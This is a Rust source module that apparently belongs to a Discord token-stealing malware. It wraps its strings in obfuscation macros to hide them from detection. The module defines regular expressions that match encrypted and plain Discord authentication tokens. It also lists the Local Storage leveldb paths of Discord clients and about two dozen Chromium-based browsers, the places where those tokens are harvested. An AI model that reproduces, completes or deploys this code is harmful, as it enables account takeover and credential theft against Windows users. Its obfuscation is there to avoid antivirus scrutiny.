use goldberg::goldberg_stmts;
use std::collections::HashMap;
use lazy_static::lazy_static;
use obfstr::obfstr as obf;

use crate::global::utils::{ROAMING, APPDATA};

goldberg_stmts! {
    lazy_static! {
        pub static ref ENCRYPTED_REGEX: String = obf!("dQw4w9WgXcQ:[^\"]*").to_string();
        pub static ref REGEX: String = obf!(r"(?-u)\b\w{20,30}\.\w{6}\.\w{25,110}\b").to_string();
        pub static ref PATHS: HashMap<String, String> = {
            let roaming = ROAMING.as_str();
            let appdata = APPDATA.as_str();
                
            return HashMap::from([
                (String::from(obf!("Discord")), format!("{}{}", roaming, obf!("\\discord\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Discord Canary")), format!("{}{}", roaming, obf!("\\discordcanary\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Lightcord")), format!("{}{}", roaming, "\\Lightcord\\Local Storage\\leveldb\\")),
                (String::from(obf!("Discord PTB")), format!("{}{}", roaming, obf!("\\discordptb\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Opera")), format!("{}{}", roaming, obf!("\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Opera GX")), format!("{}{}", roaming, obf!("\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Amigo")), format!("{}{}", appdata, obf!("\\Amigo\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Torch")), format!("{}{}", appdata, obf!("\\Torch\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Kometa")), format!("{}{}", appdata, obf!("\\Kometa\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Orbitum")), format!("{}{}", appdata, obf!("\\Orbitum\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("CentBrowser")), format!("{}{}", appdata, obf!("\\CentBrowser\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("7Star")), format!("{}{}", appdata, obf!("\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Sputnik")), format!("{}{}", appdata, obf!("\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Vivaldi")), format!("{}{}", appdata, obf!("\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Chrome SxS")), format!("{}{}", appdata, obf!("\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Chrome")), format!("{}{}", appdata, obf!("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Chrome1")), format!("{}{}", appdata, obf!("\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Chrome2")), format!("{}{}", appdata, obf!("\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Chrome3")), format!("{}{}", appdata, obf!("\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Chrome4")), format!("{}{}", appdata, obf!("\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Chrome5")), format!("{}{}", appdata, obf!("\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Epic Privacy Browser")), format!("{}{}", appdata, obf!("\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Microsoft Edge")), format!("{}{}", appdata, obf!("\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Uran")), format!("{}{}", appdata, obf!("\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Yandex")), format!("{}{}", appdata, obf!("\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Brave")), format!("{}{}", appdata, obf!("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\"))),
                (String::from(obf!("Iridium")), format!("{}{}", appdata, obf!("\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\"))),
            ]);
                
        };
    }
}